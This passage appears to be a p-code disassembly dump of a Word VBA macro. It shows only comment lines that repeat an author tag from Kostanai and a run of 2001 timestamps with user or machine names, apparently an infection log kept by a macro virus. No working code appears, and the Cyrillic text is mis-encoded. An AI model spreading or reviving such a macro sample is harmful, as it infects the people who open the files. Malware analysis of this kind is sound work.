' 	QuoteRem 0x0000 0x0000 ""
' Line #998:
' Line #999:
' Line #1000:
' Line #1001:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1002:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1003:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1004:
' 	QuoteRem 0x0000 0x0020 " 16:08:41 - ÷åòâåðã, 29 ìàð 2001"
' Line #1005:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1006:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1007:
' Line #1008:
' Line #1009:
' Line #1010:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1011:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1012:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1013:
' 	QuoteRem 0x0000 0x0020 " 16:22:21 - ÷åòâåðã, 29 ìàð 2001"
' Line #1014:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1015:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1016:
' Line #1017:
' Line #1018:
' Line #1019:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1020:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1021:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1022:
' 	QuoteRem 0x0000 0x0020 " 11:22:20 - ïÿòíèöà, 30 ìàð 2001"
' Line #1023:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1024:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1025:
' Line #1026:
' Line #1027:
' Line #1028:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1029:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1030:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1031:
' 	QuoteRem 0x0000 0x0020 " 11:23:21 - ïÿòíèöà, 30 ìàð 2001"
' Line #1032:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1033:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1034:
' Line #1035:
' Line #1036:
' Line #1037:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1038:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1039:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1040:
' 	QuoteRem 0x0000 0x0023 " 08:38:16 - ïîíåäåëüíèê, 2 àïð 2001"
' Line #1041:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1042:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1043:
' Line #1044:
' Line #1045:
' Line #1046:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1047:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1048:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1049:
' 	QuoteRem 0x0000 0x0023 " 08:47:00 - ïîíåäåëüíèê, 2 àïð 2001"
' Line #1050:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1051:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1052:
' Line #1053:
' Line #1054:
' Line #1055:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1056:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1057:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1058:
' 	QuoteRem 0x0000 0x0023 " 10:15:45 - ïîíåäåëüíèê, 2 àïð 2001"
' Line #1059:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1060:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1061:
' Line #1062:
' Line #1063:
' Line #1064:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1065:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1066:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1067:
' 	QuoteRem 0x0000 0x0023 " 10:16:38 - ïîíåäåëüíèê, 2 àïð 2001"
' Line #1068:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1069:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1070:
' Line #1071:
' Line #1072:
' Line #1073:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1074:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1075:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1076:
' 	QuoteRem 0x0000 0x001F " 10:42:56 - âòîðíèê, 3 àïð 2001"
' Line #1077:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1078:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1079:
' Line #1080:
' Line #1081:
' Line #1082:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1083:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1084:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1085:
' 	QuoteRem 0x0000 0x001F " 11:25:46 - âòîðíèê, 3 àïð 2001"
' Line #1086:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1087:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1088:
' Line #1089:
' Line #1090:
' Line #1091:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1092:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1093:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1094:
' 	QuoteRem 0x0000 0x001F " 11:29:29 - âòîðíèê, 3 àïð 2001"
' Line #1095:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1096:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1097:
' Line #1098:
' Line #1099:
' Line #1100:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1101:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1102:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1103:
' 	QuoteRem 0x0000 0x001D " 22:11:17 - ñðåäà, 4 àïð 2001"
' Line #1104:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1105:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1106:
' Line #1107:
' Line #1108:
' Line #1109:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1110:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1111:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1112:
' 	QuoteRem 0x0000 0x001D " 22:13:02 - ñðåäà, 4 àïð 2001"
' Line #1113:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1114:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1115:
' Line #1116:
' Line #1117:
' Line #1118:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1119:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1120:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1121:
' 	QuoteRem 0x0000 0x001D " 22:27:52 - ñðåäà, 4 àïð 2001"
' Line #1122:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1124:
' Line #1125:
' Line #1126:
' Line #1127:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1128:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1129:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1130:
' 	QuoteRem 0x0000 0x001D " 23:05:37 - ñðåäà, 4 àïð 2001"
' Line #1131:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1132:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1133:
' Line #1134:
' Line #1135:
' Line #1136:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1137:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1138:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1139:
' 	QuoteRem 0x0000 0x001F " 09:31:02 - ÷åòâåðã, 5 àïð 2001"
' Line #1140:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1141:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1142:
' Line #1143:
' Line #1144:
' Line #1145:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1146:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1147:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1148:
' 	QuoteRem 0x0000 0x001F " 09:41:43 - ÷åòâåðã, 5 àïð 2001"
' Line #1149:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1150:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1151:
' Line #1152:
' Line #1153:
' Line #1154:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1155:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1156:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1157:
' 	QuoteRem 0x0000 0x001F " 09:43:49 - ÷åòâåðã, 5 àïð 2001"
' Line #1158:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1159:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1160:
' Line #1161:
' Line #1162:
' Line #1163:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1164:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1165:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1166:
' 	QuoteRem 0x0000 0x001F " 09:45:18 - ÷åòâåðã, 5 àïð 2001"
' Line #1167:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1168:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1169:
' Line #1170:
' Line #1171:
' Line #1172:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1173:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1174:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1175:
' 	QuoteRem 0x0000 0x001F " 09:47:36 - ÷åòâåðã, 5 àïð 2001"
' Line #1176:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1177:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1178:
' Line #1179:
' Line #1180:
' Line #1181:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1182:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1183:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1184:
' 	QuoteRem 0x0000 0x001F " 09:49:42 - ÷åòâåðã, 5 àïð 2001"
' Line #1185:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1187:
' Line #1188:
' Line #1189:
' Line #1190:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1191:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1192:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1193:
' 	QuoteRem 0x0000 0x001F " 22:14:22 - ÷åòâåðã, 5 àïð 2001"
' Line #1194:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1195:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1196:
' Line #1197:
' Line #1198:
' Line #1199:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1200:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1201:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1202:
' 	QuoteRem 0x0000 0x0023 " 15:09:44 - âîñêðåñåíüå, 8 àïð 2001"
' Line #1203:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1204:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1205:
' Line #1206:
' Line #1207:
' Line #1208:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1209:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1210:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1211:
' 	QuoteRem 0x0000 0x0023 " 16:14:18 - âîñêðåñåíüå, 8 àïð 2001"
' Line #1212:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1213:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1214:
' Line #1215:
' Line #1216:
' Line #1217:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1218:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1219:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1220:
' 	QuoteRem 0x0000 0x0023 " 21:01:32 - âîñêðåñåíüå, 8 àïð 2001"
' Line #1221:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1222:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1223:
' Line #1224:
' Line #1225:
' Line #1226:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1227:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1228:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1229:
' 	QuoteRem 0x0000 0x0023 " 21:01:55 - âîñêðåñåíüå, 8 àïð 2001"
' Line #1230:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1231:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1232:
' Line #1233:
' Line #1234:
' Line #1235:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1236:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1237:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1238:
' 	QuoteRem 0x0000 0x0023 " 21:38:59 - âîñêðåñåíüå, 8 àïð 2001"
' Line #1239:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1240:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1241:
' Line #1242:
' Line #1243:
' Line #1244:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1245:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1246:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1247:
' 	QuoteRem 0x0000 0x0023 " 22:09:26 - ïîíåäåëüíèê, 9 àïð 2001"
' Line #1248:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1249:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1250:
' Line #1251:
' Line #1252:
' Line #1253:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1254:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1255:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1256:
' 	QuoteRem 0x0000 0x0023 " 23:07:33 - ïîíåäåëüíèê, 9 àïð 2001"
' Line #1257:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1258:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1259:
' Line #1260:
' Line #1261:
' Line #1262:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1263:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1264:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1265:
' 	QuoteRem 0x0000 0x0024 " 22:16:47 - âîñêðåñåíüå, 22 àïð 2001"
' Line #1266:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1267:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1268:
' Line #1269:
' Line #1270:
' Line #1271:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1272:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1273:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1274:
' 	QuoteRem 0x0000 0x0024 " 22:37:01 - âîñêðåñåíüå, 22 àïð 2001"
' Line #1275:
' 	QuoteRem 0x0000 0x000F " Ðàõìåòîâ Ìàðàò"
' Line #1276:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1277:
' Line #1278:
' Line #1279:
' Line #1280:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1281:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1282:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1283:
' 	QuoteRem 0x0000 0x0020 " 14:27:14 - ïÿòíèöà, 27 àïð 2001"
' Line #1284:
' 	QuoteRem 0x0000 0x0003 " ÍÊ"
' Line #1285:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1286:
' Line #1287:
' Line #1288:
' Line #1289:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1290:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1291:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1292:
' 	QuoteRem 0x0000 0x001F " 11:32:49 - ÷åòâåðã, 3 ìàé 2001"
' Line #1293:
' 	QuoteRem 0x0000 0x0003 " ÍÊ"
' Line #1294:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1295:
' Line #1296:
' Line #1297:
' Line #1298:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1299:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1300:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1301:
' 	QuoteRem 0x0000 0x0020 " 15:24:13 - ñóááîòà, 19 ìàé 2001"
' Line #1302:
' 	QuoteRem 0x0000 0x0009 " Orgotdel"
' Line #1303:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1304:
' Line #1305:
' Line #1306:
' Line #1307:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1308:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1309:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1310:
' 	QuoteRem 0x0000 0x0024 " 09:45:51 - ïîíåäåëüíèê, 21 ìàé 2001"
' Line #1311:
' 	QuoteRem 0x0000 0x0005 " post"
' Line #1312:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1313:
' Line #1314:
' Line #1315:
' Line #1316:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1317:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1318:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1319:
' 	QuoteRem 0x0000 0x0024 " 14:31:59 - ïîíåäåëüíèê, 21 ìàé 2001"
' Line #1320:
' 	QuoteRem 0x0000 0x0005 " post"
' Line #1321:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1322:
' Line #1323:
' Line #1324:
' Line #1325:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1326:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1327:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1328:
' 	QuoteRem 0x0000 0x0024 " 22:43:31 - ïîíåäåëüíèê, 21 ìàé 2001"
' Line #1329:
' 	QuoteRem 0x0000 0x0005 " post"
' Line #1330:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1331:
' Line #1332:
' Line #1333:
' Line #1334:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1335:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1336:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1337:
' 	QuoteRem 0x0000 0x001E " 10:21:07 - ñðåäà, 23 ìàé 2001"
' Line #1338:
' 	QuoteRem 0x0000 0x0005 " post"
' Line #1339:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1340:
' Line #1341:
' Line #1342:
' Line #1343:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1344:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1345:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1346:
' 	QuoteRem 0x0000 0x001E " 18:17:00 - ñðåäà, 23 ìàé 2001"
' Line #1347:
' 	QuoteRem 0x0000 0x0005 " host"
' Line #1348:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1349:
' Line #1350:
' Line #1351:
' Line #1352:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1353:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1354:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1355:
' 	QuoteRem 0x0000 0x0020 " 15:52:42 - ÷åòâåðã, 24 ìàé 2001"
' Line #1356:
' 	QuoteRem 0x0000 0x0005 " host"
' Line #1357:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1358:
' Line #1359:
' Line #1360:
' Line #1361:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1362:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1363:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1364:
' 	QuoteRem 0x0000 0x0020 " 12:42:41 - ïÿòíèöà, 25 ìàé 2001"
' Line #1365:
' 	QuoteRem 0x0000 0x0005 " orb1"
' Line #1366:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1367:
' Line #1368:
' Line #1369:
' Line #1370:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1371:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1372:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1373:
' 	QuoteRem 0x0000 0x0020 " 17:03:26 - ïÿòíèöà, 25 ìàé 2001"
' Line #1374:
' 	QuoteRem 0x0000 0x0008 " Gulnara"
' Line #1375:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1376:
' Line #1377:
' Line #1378:
' Line #1379:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1380:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1381:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1382:
' 	QuoteRem 0x0000 0x0024 " 12:28:03 - ïîíåäåëüíèê, 28 ìàé 2001"
' Line #1383:
' 	QuoteRem 0x0000 0x0008 " Gulnara"
' Line #1384:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1385:
' Line #1386:
' Line #1387:
' Line #1388:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1389:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1390:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1391:
' 	QuoteRem 0x0000 0x0020 " 16:33:05 - âòîðíèê, 29 ìàé 2001"
' Line #1392:
' 	QuoteRem 0x0000 0x0008 " Gulnara"
' Line #1393:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1394:
' Line #1395:
' Line #1396:
' Line #1397:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1398:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1399:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1400:
' 	QuoteRem 0x0000 0x001E " 16:31:46 - ñðåäà, 30 ìàé 2001"
' Line #1401:
' 	QuoteRem 0x0000 0x0004 " Ice"
' Line #1402:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1403:
' Line #1404:
' Line #1405:
' Line #1406:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1407:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1408:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1409:
' 	QuoteRem 0x0000 0x0020 " 20:46:38 - ÷åòâåðã, 31 ìàé 2001"
' Line #1410:
' 	QuoteRem 0x0000 0x0004 " Ice"
' Line #1411:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1412:
' Line #1413:
' Line #1414:
' Line #1415:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1416:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1417:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1418:
' 	QuoteRem 0x0000 0x001F " 14:15:46 - ïÿòíèöà, 1 èþí 2001"
' Line #1419:
' 	QuoteRem 0x0000 0x0004 " Ice"
' Line #1420:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1421:
' Line #1422:
' Line #1423:
' Line #1424:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1425:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1426:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1427:
' 	QuoteRem 0x0000 0x0023 " 16:46:56 - ïîíåäåëüíèê, 4 èþí 2001"
' Line #1428:
' 	QuoteRem 0x0000 0x0004 " Ice"
' Line #1429:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1430:
' Line #1431:
' Line #1432:
' Line #1433:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1434:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1435:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1436:
' 	QuoteRem 0x0000 0x001F " 14:34:05 - âòîðíèê, 5 èþí 2001"
' Line #1437:
' 	QuoteRem 0x0000 0x0004 " Ice"
